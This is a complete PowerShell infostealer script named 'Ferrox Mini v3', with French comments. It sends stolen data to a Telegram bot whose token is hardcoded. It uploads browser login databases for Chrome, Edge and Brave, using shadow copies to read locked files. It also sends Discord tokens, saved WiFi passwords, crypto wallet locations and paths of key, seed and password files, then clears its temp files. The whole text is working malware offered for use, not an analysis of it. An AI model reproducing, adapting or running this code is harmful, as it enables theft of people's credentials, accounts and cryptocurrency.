# Ferrox Mini v3 — VSS pour fichiers verrouillés + Upload corrigé
$BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
$CI="8468737863"

function TG($t){
    $wc=New-Object Net.WebClient
    $data="chat_id=$CI&text="+[uri]::EscapeDataString($t)
    $wc.UploadString("https://api.telegram.org/bot$BT/sendMessage",$data)|Out-Null
}

TG "FERROX: $env:COMPUTERNAME / $env:USERNAME"

# System info
try{$os=(Get-WmiObject Win32_OperatingSystem).Caption}catch{$os="?"}
try{$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)}catch{$ram="?"}
try{$ip=(Invoke-WebRequest "https://api.ipify.org" -UseBasicParsing -TimeoutSec 3).Content}catch{$ip="?"}
TG "OS: $os | RAM: ${ram}GB | IP: $ip"

# VSS copy function for locked files
function VSS-COPY($src,$dst){
    $snap=(Get-WmiObject -List Win32_ShadowCopy).Create($src,"ClientAccessible")
    if($snap.ShadowID){
        $snapObj=Get-WmiObject Win32_ShadowCopy | ?{$_.ID -eq $snap.ShadowID}
        $snapPath=$snapObj.DeviceObject + "\"
        $relPath=$src.Replace((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$($src.Substring(0,2))'").VolumeName+"\","")
        Copy-Item ($snapPath+$relPath) $dst -Force -EA 0
        $snapObj.Delete()
    }
}

# Chrome + browsers
$browsers=@("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
foreach($base in $browsers){
    if(!(Test-Path $base)){continue}
    Get-ChildItem $base -Directory -EA 0 | %{
        $p=$_.FullName
        @("Login Data","Web Data","History","Bookmarks") | %{
            $f="$p\$_"
            if(Test-Path $f){
                $tmp="$env:TEMP\fx_$((Get-Date).Ticks).dat"
                Copy-Item $f $tmp -Force -EA 0
                if(!(Test-Path $tmp)){VSS-COPY $f $tmp}
                if(Test-Path $tmp){
                    SEND-FILE $tmp "$($_.Name)"
                    Remove-Item $tmp -Force -EA 0
                }
            }
        }
    }
}
TG "BROWSERS: done"

# Discord tokens
$discords=@("$env:APPDATA\discord\Local Storage\leveldb","$env:APPDATA\discordcanary\Local Storage\leveldb")
foreach($dp in $discords){
    if(!(Test-Path $dp)){continue}
    Get-ChildItem $dp -Filter "*.ldb" -EA 0 | %{
        $c=Get-Content $_.FullName -Raw -EA 0
        if($c -and $c -match '([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})'){
            TG "DISCORD: $($Matches[1])"
        }
    }
}

# WiFi
try{netsh wlan show profiles 2>&1|Select-String ":\s+"|%{$p=$_ -replace '.*:\s+','';$d=netsh wlan show profile name="$p" key=clear;$k=$d|Select-String "Key Content"|%{$_ -replace '.*:\s+',''};TG "WIFI: $p = $k"}}catch{}

# Wallets
$wallets=@("$env:APPDATA\Exodus","$env:APPDATA\atomic","$env:APPDATA\Electrum\wallets","$env:APPDATA\Ledger Live","$env:APPDATA\phantom","$env:LOCALAPPDATA\Ronin","$env:APPDATA\Binance")
foreach($w in $wallets){if(Test-Path $w){TG "WALLET: $w"}}

# Fichiers
Get-ChildItem "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents" -Recurse -Include "*.kdbx","*.seed","*.wallet","*.pem","*.key","*password*" -EA 0 -Depth 3|%{TG "FILE: $($_.FullName)"}

function SEND-FILE($path,$name){
    if(!(Test-Path $path)){return}
    $sz=(Get-Item $path).Length;if($sz -eq 0){return}
    $u="https://api.telegram.org/bot$BT/sendDocument"
    $bd="fx$(Get-Random)";$N="`r`n";$B=[Text.Encoding]::UTF8
    $hdr="--$bd$N"+"Content-Disposition: form-data; name=`"chat_id`"$N$N$CI$N"+"--$bd$N"+"Content-Disposition: form-data; name=`"document`"; filename=`"$name`"$N"+"Content-Type: application/octet-stream$N$N"
    $ftr="$N--$bd--$N"
    $bh=$B.GetBytes($hdr);$bf=$B.GetBytes($ftr);$bb=[IO.File]::ReadAllBytes($path)
    $all=New-Object byte[]($bh.Length+$bb.Length+$bf.Length)
    [Buffer]::BlockCopy($bh,0,$all,0,$bh.Length)
    [Buffer]::BlockCopy($bb,0,$all,$bh.Length,$bb.Length)
    [Buffer]::BlockCopy($bf,0,$all,$bh.Length+$bb.Length,$bf.Length)
    try{$wc=New-Object Net.WebClient;$wc.Headers.Add("Content-Type","multipart/form-data; boundary=$bd");$wc.UploadData($u,$all)|Out-Null}catch{}
}

Get-ChildItem $env:TEMP -Filter "fx_*" -EA 0|Remove-Item -Force -EA 0
TG "FERROX DONE"
